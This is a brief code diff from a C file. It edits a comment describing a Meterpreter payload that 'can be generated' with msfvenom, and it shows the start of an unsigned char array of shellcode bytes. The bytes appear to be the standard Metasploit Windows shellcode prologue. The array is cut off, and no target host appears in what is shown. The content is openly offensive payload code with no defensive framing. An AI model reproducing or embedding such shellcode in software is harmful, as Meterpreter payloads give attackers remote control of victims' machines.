@@ -1,5 +1,6 @@
 
-// meterpreter payload 
+// meterpreter shellcode, can be generated from source or simply generated using a tool like msfvenom
+
 unsigned char shellcd[] = 
 "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
 "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
